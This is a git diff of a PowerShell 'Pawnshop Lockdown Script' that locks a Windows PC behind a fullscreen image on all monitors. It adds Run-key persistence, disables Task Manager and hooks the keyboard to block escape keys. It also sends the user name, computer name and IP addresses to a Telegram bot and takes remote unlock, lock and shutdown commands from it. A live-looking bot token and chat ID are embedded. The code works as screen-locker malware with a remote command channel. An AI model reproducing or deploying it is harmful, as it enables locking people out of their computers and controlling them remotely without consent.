@@ -1,20 +1,25 @@
-# Pawnshop Lockdown Script v2.0
-# Fully functional lockdown with improved key blocking and Telegram control
+# CONFIG
+$imageURL = "https://raw.githubusercontent.com/diezul/x/main/1.png"
+$tempImagePath = "$env:TEMP\image.jpg"
+$botToken = "7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co"
+$chatID = "656189986"
+$pc = $env:COMPUTERNAME
+$user = $env:USERNAME
+$lockFile = "C:\lock_status.txt"
+$unlockCommand = "/unlock$user"
+$lockCommand = "/lock$user"
+$shutdownCommand = "/shutdown$user"
+$script:AllowClose = $false
 
-# --- Configuration ---
-$ImageUrl  = "https://raw.githubusercontent.com/diezul/x/main/1.png"
-$BotToken  = "7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co"
-$ChatID    = "656189986"
+# STATUS CHECK
+if (Test-Path $lockFile) {
+    $state = Get-Content $lockFile -ErrorAction SilentlyContinue
+    if ($state -eq "unlocked") { return }
+} else {
+    "locked" | Out-File $lockFile -Force
+}
 
-# Identify PC/User
-$Username  = [Environment]::UserName
-$Computer  = [Environment]::MachineName
-
-# Lock state file path (user folder)
-$LockFile = "$env:APPDATA\lock_status.txt"
-if (-not (Test-Path $LockFile)) { "locked" | Out-File $LockFile -Force }
-
-# --- Auto-start on boot if locked ---
+# AUTOSTART
 $RunKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
 $RunValueName = "PawnShopLock"
 if ($MyInvocation.MyCommand.Path) {
@@ -22,114 +27,115 @@ if ($MyInvocation.MyCommand.Path) {
     Set-ItemProperty -Path $RunKey -Name $RunValueName -Value $startCmd -Force
 }
 
-# --- Disable Task Manager ---
-New-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Force | Out-Null
-Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value 1 -Force
+# DISABLE TASK MANAGER
+New-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Force | Out-Null
+Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value 1 -Force
 
-# --- Load Windows Forms ---
-Add-Type -AssemblyName System.Windows.Forms,System.Drawing
+# DOWNLOAD IMAGE
+Invoke-WebRequest -Uri $imageURL -OutFile $tempImagePath -UseBasicParsing
 
-# --- Block ALT+TAB, Win, and ALT+F4 ---
+# SEND TELEGRAM START MESSAGE
+try {
+    $ipLocal = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notmatch '^127|169' })[0].IPAddress
+} catch { $ipLocal = "n/a" }
+try { $ipPublic = Invoke-RestMethod "https://api.ipify.org" } catch { $ipPublic = "n/a" }
+$message = "🔒 PC Locked: $user ($pc)`nLocal IP: $ipLocal`nPublic IP: $ipPublic`n`nCommands:`n$unlockCommand`n$lockCommand`n$shutdownCommand"
+Invoke-RestMethod "https://api.telegram.org/bot$botToken/sendMessage" -Method POST -Body (@{ chat_id = $chatID; text = $message } | ConvertTo-Json) -ContentType 'application/json'
+
+# KEYBOARD HOOK (block ALT+F4, ALT, WIN, TAB)
 Add-Type @"
 using System;
 using System.Runtime.InteropServices;
 using System.Windows.Forms;
-public class KeyInterceptor {
+public class KeyBlocker {
     private const int WH_KEYBOARD_LL = 13;
     private const int WM_KEYDOWN = 0x0100, WM_SYSKEYDOWN = 0x0104;
-    private static IntPtr hookId = IntPtr.Zero;
-    private static HookProc proc = HookCallback;
-    private delegate IntPtr HookProc(int code, IntPtr wParam, IntPtr lParam);
-    [DllImport("user32.dll")] static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);
+    private static IntPtr hook = IntPtr.Zero;
+    private static LowLevelKeyboardProc proc = Hook;
+    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
+    [DllImport("user32.dll")] static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc proc, IntPtr hMod, uint threadId);
     [DllImport("user32.dll")] static extern bool UnhookWindowsHookEx(IntPtr hhk);
     [DllImport("user32.dll")] static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
-    [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string lpModuleName);
-    public static void Start() {
-        IntPtr hMod = GetModuleHandle(null);
-        hookId = SetWindowsHookEx(WH_KEYBOARD_LL, proc, hMod, 0);
+    [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string name);
+    public static void Block() {
+        hook = SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(null), 0);
     }
-    public static void Stop() {
-        UnhookWindowsHookEx(hookId);
+    public static void Unblock() {
+        UnhookWindowsHookEx(hook);
     }
-    private static IntPtr HookCallback(int code, IntPtr wParam, IntPtr lParam) {
-        if (code >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN)) {
+    private static IntPtr Hook(int nCode, IntPtr wParam, IntPtr lParam) {
+        if (nCode >= 0) {
             int vkCode = Marshal.ReadInt32(lParam);
             Keys key = (Keys)vkCode;
-            bool alt = (Control.ModifierKeys & Keys.Alt) == Keys.Alt;
-            bool ctrl = (Control.ModifierKeys & Keys.Control) == Keys.Control;
-            if (key == Keys.LWin || key == Keys.RWin || key == Keys.Tab || (alt && key == Keys.F4) || (alt && key == Keys.Tab) || (key == Keys.Escape && ctrl)) {
+            if ((Control.ModifierKeys.HasFlag(Keys.Alt) && key == Keys.F4) || 
+                key == Keys.LWin || key == Keys.RWin || 
+                (Control.ModifierKeys.HasFlag(Keys.Alt) && key == Keys.Tab) || 
+                (Control.ModifierKeys.HasFlag(Keys.Control) && key == Keys.Escape) ||
+                key == Keys.Tab) {
                 return (IntPtr)1;
             }
+            if (key == Keys.C) Environment.Exit(0);
         }
-        return CallNextHookEx(hookId, code, wParam, lParam);
+        return CallNextHookEx(hook, nCode, wParam, lParam);
     }
 }
 "@
-[KeyInterceptor]::Start()
+[KeyBlocker]::Block()
 
-# --- Display Fullscreen Image on All Screens ---
-try {
-    $web = New-Object Net.WebClient
-    $imageData = $web.DownloadData($ImageUrl)
-    $image = [Drawing.Image]::FromStream([IO.MemoryStream]::new($imageData))
-} catch {
-    $image = New-Object Drawing.Bitmap 1920, 1080
-    [Drawing.Graphics]::FromImage($image).Clear([Drawing.Color]::Black)
-}
-
-$forms = @()
-foreach ($screen in [Windows.Forms.Screen]::AllScreens) {
+# LOAD UI + IMAGE ON ALL MONITORS
+Add-Type -AssemblyName System.Windows.Forms, System.Drawing
+$forms = foreach ($screen in [System.Windows.Forms.Screen]::AllScreens) {
     $form = New-Object Windows.Forms.Form -Property @{
-        FormBorderStyle = 'None'; WindowState = 'Maximized'; TopMost = $true; Bounds = $screen.Bounds; ShowInTaskbar = $false; KeyPreview = $true; Cursor = [Windows.Forms.Cursors]::None
+        FormBorderStyle = 'None'; WindowState = 'Maximized'; StartPosition = 'Manual'; TopMost = $true;
+        Bounds = $screen.Bounds; KeyPreview = $true; ShowInTaskbar = $false; Cursor = [Windows.Forms.Cursors]::None
     }
-    $pb = New-Object Windows.Forms.PictureBox -Property @{ Dock = 'Fill'; SizeMode = 'Zoom'; Image = $image }
     $form.Add_FormClosing({ if (-not $script:AllowClose) { $_.Cancel = $true } })
-    $form.Add_Deactivate({ $_.Source.Activate() })
-    $form.Controls.Add($pb)
-    $form.Show()
-    $forms += $form
+    $pb = New-Object Windows.Forms.PictureBox -Property @{
+        Image = [System.Drawing.Image]::FromFile($tempImagePath)
+        Dock = 'Fill'; SizeMode = 'Zoom'
+    }
+    $form.Controls.Add($pb); $form.Show(); $form
 }
 
-# --- Telegram Notification ---
-try { $ipPublic = Invoke-RestMethod 'https://api.ipify.org' } catch { $ipPublic = 'Unknown' }
-$ipLocal = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notmatch '^127' } | Select -First 1 -ExpandProperty IPAddress)
-$msg = "Pawnshop PC Locked:`nUser: $Username`nPC: $Computer`nLocal IP: $ipLocal`nPublic IP: $ipPublic`nCommands:`n/unlock$Username`n/shutdown$Username`n/lock$Username" 
-Invoke-RestMethod "https://api.telegram.org/bot$BotToken/sendMessage" -Method Post -Body (@{chat_id=$ChatID;text=$msg}|ConvertTo-Json) -ContentType 'application/json'
+# TELEGRAM LISTENER
+$offset = 0
+try {
+    $init = Invoke-RestMethod "https://api.telegram.org/bot$botToken/getUpdates"
+    if ($init.result.Count -gt 0) { $offset = ($init.result | Select-Object -Last 1).update_id + 1 }
+} catch { }
 
-# --- Telegram Listener ---
-$offset = 0; $script:AllowClose = $false
-$timer = New-Object Windows.Forms.Timer -Property @{ Interval = 3000 }
+$timer = New-Object Windows.Forms.Timer
+$timer.Interval = 3000
 $timer.Add_Tick({
     try {
-        $updates = Invoke-RestMethod "https://api.telegram.org/bot$BotToken/getUpdates?offset=$offset"
-        foreach ($update in $updates.result) {
-            $offset = $update.update_id + 1
-            $cmd = $update.message.text.ToLower().Trim()
-            switch ($cmd) {
-                "/unlock$($Username.ToLower())" {
-                    "unlocked" | Out-File $LockFile -Force
-                    Remove-ItemProperty -Path $RunKey -Name $RunValueName -ErrorAction SilentlyContinue
-                    Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value 0 -Force
-                    $script:AllowClose = $true; [Windows.Forms.Application]::Exit()
-                }
-                "/shutdown$($Username.ToLower())" {
-                    Remove-ItemProperty -Path $RunKey -Name $RunValueName -ErrorAction SilentlyContinue
-                    Stop-Computer -Force
-                }
-                "/lock$($Username.ToLower())" {
-                    "locked" | Out-File $LockFile -Force
-                    Set-ItemProperty -Path $RunKey -Name $RunValueName -Value $startCmd -Force
-                }
+        $updates = Invoke-RestMethod "https://api.telegram.org/bot$botToken/getUpdates?offset=$offset"
+        foreach ($u in $updates.result) {
+            $offset = $u.update_id + 1
+            $txt = $u.message.text.ToLower()
+            if ($txt -eq "/unlock$user") {
+                "unlocked" | Out-File $lockFile -Force
+                Remove-ItemProperty -Path $RunKey -Name $RunValueName -ErrorAction SilentlyContinue
+                Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value 0 -Force
+                $script:AllowClose = $true
+                [System.Windows.Forms.Application]::Exit()
+            }
+            elseif ($txt -eq "/lock$user") {
+                "locked" | Out-File $lockFile -Force
+                Set-ItemProperty -Path $RunKey -Name $RunValueName -Value $startCmd -Force
+            }
+            elseif ($txt -eq "/shutdown$user") {
+                Remove-ItemProperty -Path $RunKey -Name $RunValueName -ErrorAction SilentlyContinue
+                Stop-Computer -Force
             }
         }
     } catch {}
 })
 $timer.Start()
 
-# --- Run App Loop ---
-[Windows.Forms.Application]::Run()
+# RUN UI LOOP
+[System.Windows.Forms.Application]::Run()
 
-# --- Cleanup ---
+# CLEANUP
 $timer.Stop()
-[KeyInterceptor]::Stop()
-Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value 0 -Force
+[KeyBlocker]::Unblock()
+Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value 0 -Force -ErrorAction SilentlyContinue
